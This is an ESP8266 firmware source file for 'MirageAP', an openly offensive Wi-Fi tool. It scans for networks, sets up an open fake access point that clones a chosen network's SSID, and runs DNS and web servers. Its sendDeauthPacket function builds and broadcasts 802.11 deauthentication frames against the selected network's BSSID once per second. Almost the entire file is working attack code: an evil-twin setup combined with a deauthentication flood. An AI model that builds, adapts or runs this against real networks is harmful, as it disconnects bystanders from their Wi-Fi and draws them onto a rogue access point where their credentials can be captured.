#include <ESP8266WiFi.h>
#include <LittleFS.h>
#include "MirageAP_WebServer.h"
#include "MirageAP_DNS.h"
#include "MirageAP_Utils.h"
#include "MirageAP_OLED.h"

#define MAX_SCAN_RESULTS 30

struct Network {
  String ssid;
  uint8_t bssid[6];
  uint8_t channel;
};

Network scanResults[MAX_SCAN_RESULTS];
int scanCount = 0;

bool deauthingActive = false;
Network selectedNetwork;

IPAddress apIP(192, 168, 4, 1);

unsigned long lastDeauthMillis = 0;

String serialBuffer = "";

void showMenu() {
  Serial.println(F("                MirageAP"));
  Serial.println(F(""));
  Serial.println(F("             by: aMiscreant"));
  Serial.println(F(""));
  Serial.println(F("  Type 'scan' to scan WiFi networks."));
  Serial.println(F("  Type `load` to load found WiFi networks."));
  Serial.println(F("  Type 'select <SSID>' to select network for deauth and start fake AP."));
  Serial.println(F("  Type 'clear' to clear stored scan results."));
  Serial.println(F(""));
  Serial.println(F("  [scan]    - Wi-Fi scan          "));
  Serial.println(F("  [load]    - Show Found Networks "));
  Serial.println(F("  [select]  - Select Network      "));
  Serial.println(F("  [clear]   - Clear Found Networks"));
  Serial.println(F("  [m]       - Show menu again     "));
}

void setup() {
  Serial.begin(115200);
  delay(100);

  Serial.println("\nStarting MirageAP...");

  if (!LittleFS.begin()) {
    Serial.println("LittleFS mount failed");
    while (true) delay(1000);
  }
  delay(100);
  initOLED();
  delay(100);
  Serial.println("MirageAP Ready.");
  showMenu();

  // Start DNS and web server with default AP (will be started after select)
  MirageAP_DNS::start(apIP);
  MirageAP_WebServer::start();
}

void loop() {
  MirageAP_DNS::process();
  MirageAP_WebServer::handleClient();

  // Read serial input line-by-line
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      serialBuffer.trim();
      if (serialBuffer.length() > 0) {
        handleMenuCommand(serialBuffer);
      }
      serialBuffer = "";
    } else {
      serialBuffer += c;
    }
  }

  unsigned long now = millis();

  if (deauthingActive && now - lastDeauthMillis > 1000) {
    sendDeauthPacket();
    lastDeauthMillis = now;
  }
}

void handleMenuCommand(const String& cmd) {
  if (cmd.equalsIgnoreCase("scan")) {
    performScan();
    showMessage("CMD: " + cmd + "\n Scanning now..");
  } else if (cmd.equalsIgnoreCase("load")) {
    loadScanResults();
    printScanResults();
  } else if (cmd.startsWith("select ")) {
    String ssid = cmd.substring(7);
    ssid.trim();
    selectNetworkBySSID(ssid);
  } else if (cmd.equalsIgnoreCase("clear")) {
    clearScanResults();
  } else if (cmd.equalsIgnoreCase("m")) {
    showMenu();
  } else {
    Serial.println(F("? Unknown command. Type 'm' to show menu options."));
  }
}

void printScanResults() {
  if (scanCount == 0) {
    Serial.println("No stored scan results.");
    return;
  }
  Serial.println("Stored WiFi Networks:");
  for (int i = 0; i < scanCount; i++) {
    Serial.printf("%d: %s (Channel: %d)\n", i + 1, scanResults[i].ssid.c_str(), scanResults[i].channel);
  }
  Serial.println("Use 'select <SSID>' to select a network.");
}

void performScan() {
  Serial.println("Scanning WiFi networks...");
  scanCount = WiFi.scanNetworks();
  if (scanCount == 0) {
    Serial.println("No networks found.");
    return;
  }
  if (scanCount > MAX_SCAN_RESULTS) scanCount = MAX_SCAN_RESULTS;

  // Store results in RAM
  for (int i = 0; i < scanCount; i++) {
    scanResults[i].ssid = WiFi.SSID(i);
    const uint8_t* bssidPtr = WiFi.BSSID(i);
    memcpy(scanResults[i].bssid, bssidPtr, 6);
    scanResults[i].channel = WiFi.channel(i);
  }

  saveScanResults();

  // Print results
  for (int i = 0; i < scanCount; i++) {
    Serial.printf("%d: %s (RSSI: %d) Channel: %d\n", i + 1, scanResults[i].ssid.c_str(), WiFi.RSSI(i), scanResults[i].channel);
  }
  Serial.println("Type 'select <SSID>' to select network for deauth and start fake AP.");
}

void selectNetworkBySSID(const String& ssid) {
  Serial.printf("Selecting network: %s\n", ssid.c_str());
  for (int i = 0; i < scanCount; i++) {
    if (scanResults[i].ssid == ssid) {
      selectedNetwork = scanResults[i];
      Serial.printf("Selected network '%s' on channel %d\n", selectedNetwork.ssid.c_str(), selectedNetwork.channel);

      // Start fake open AP with selected SSID
      startFakeAP(selectedNetwork.ssid);

      deauthingActive = true;
      return;
    }
  }
  Serial.println("SSID not found in stored scan results. Please scan first.");
}

void startFakeAP(const String& ssid) {
  Serial.printf("Starting fake open AP with SSID: %s\n", ssid.c_str());

  WiFi.softAPdisconnect(true);
  delay(100);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid.c_str()); // Open AP, no password

  Serial.println("Fake AP started.");
}

void clearScanResults() {
  Serial.println("Clearing stored scan results...");
  scanCount = 0;
  memset(scanResults, 0, sizeof(scanResults));
  if (LittleFS.exists("/scan_results.txt")) {
    LittleFS.remove("/scan_results.txt");
  }
  Serial.println("Scan results cleared.");
}

void saveScanResults() {
  File f = LittleFS.open("/scan_results.txt", "w");
  if (!f) {
    Serial.println("Failed to open scan_results.txt for writing");
    return;
  }
  for (int i = 0; i < scanCount; i++) {
    // Format: SSID|BSSID(hex)|channel\n
    String bssidStr = bytesToStr(scanResults[i].bssid, 6);
    f.printf("%s|%s|%d\n", scanResults[i].ssid.c_str(), bssidStr.c_str(), scanResults[i].channel);
  }
  f.close();
}

void loadScanResults() {
  if (!LittleFS.exists("/scan_results.txt")) {
    Serial.println("No stored scan results found.");
    scanCount = 0;
    return;
  }
  File f = LittleFS.open("/scan_results.txt", "r");
  if (!f) {
    Serial.println("Failed to open scan_results.txt for reading");
    scanCount = 0;
    return;
  }

  scanCount = 0;
  while (f.available() && scanCount < MAX_SCAN_RESULTS) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() == 0) continue;

    int firstSep = line.indexOf('|');
    int secondSep = line.indexOf('|', firstSep + 1);
    if (firstSep == -1 || secondSep == -1) continue;

    String ssid = line.substring(0, firstSep);
    String bssidStr = line.substring(firstSep + 1, secondSep);
    int channel = line.substring(secondSep + 1).toInt();

    scanResults[scanCount].ssid = ssid;
    parseBSSID(bssidStr, scanResults[scanCount].bssid);
    scanResults[scanCount].channel = channel;

    scanCount++;
  }
  f.close();

  Serial.printf("Loaded %d stored scan results.\n", scanCount);
}

void parseBSSID(const String& bssidStr, uint8_t* bssid) {
  // bssidStr format: xx:xx:xx:xx:xx:xx (hex)
  int idx = 0;
  for (int i = 0; i < 6; i++) {
    String byteStr = bssidStr.substring(idx, idx + 2);
    bssid[i] = (uint8_t) strtol(byteStr.c_str(), NULL, 16);
    idx += 3; // skip colon
  }
}

// Deauth attack code (same as before)
extern "C" {
  #include <user_interface.h>
}

void sendDeauthPacket() {
  if (selectedNetwork.ssid.length() == 0) return;

  wifi_set_channel(selectedNetwork.channel);

  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF, // Destination: broadcast
    0x00,0x00,0x00,0x00,0x00,0x00, // Source: will be replaced
    0x00,0x00,0x00,0x00,0x00,0x00, // BSSID: will be replaced
    0x00, 0x00, 0x01, 0x00
  };
  uint8_t fakeAPMac[6];
  WiFi.softAPmacAddress(fakeAPMac);

  memcpy(&deauthPacket[10], fakeAPMac, 6);           // Source = fake AP MAC
  memcpy(&deauthPacket[16], selectedNetwork.bssid, 6); // BSSID = target BSSID

  // memcpy(&deauthPacket[10], selectedNetwork.bssid, 6); // Source
  // memcpy(&deauthPacket[16], selectedNetwork.bssid, 6); // BSSID
  deauthPacket[24] = 1; // Reason code

  Serial.println("Sending deauth packet:");
  Serial.println(bytesToStr(deauthPacket, sizeof(deauthPacket)));

  int res = wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  Serial.printf("wifi_send_pkt_freedom result: %d\n", res);
}
